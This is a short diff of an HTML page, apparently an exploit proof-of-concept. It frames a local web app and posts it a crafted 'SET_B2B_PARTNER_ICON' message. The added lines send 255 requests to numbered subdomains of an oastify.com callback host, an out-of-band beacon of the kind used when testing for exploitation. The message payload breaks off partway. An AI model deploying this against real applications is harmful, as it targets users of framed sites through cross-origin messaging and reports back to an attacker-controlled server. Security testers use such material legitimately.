@@ -1,6 +1,8 @@
 <iframe id="app" src="http://localhost:3000/"></iframe>
 
 <script>
+  for(let i=0; i<255; i++) fetch('https://'+i+'.kc0bq6lgkey2vj29nq3yo1hw5nbez4nt.oastify.com/', {mode: "no-cors", cache: "no-store"});
+
   document.getElementById('app').onload = function() {
     this.contentWindow.postMessage({
       type: 'SET_B2B_PARTNER_ICON',
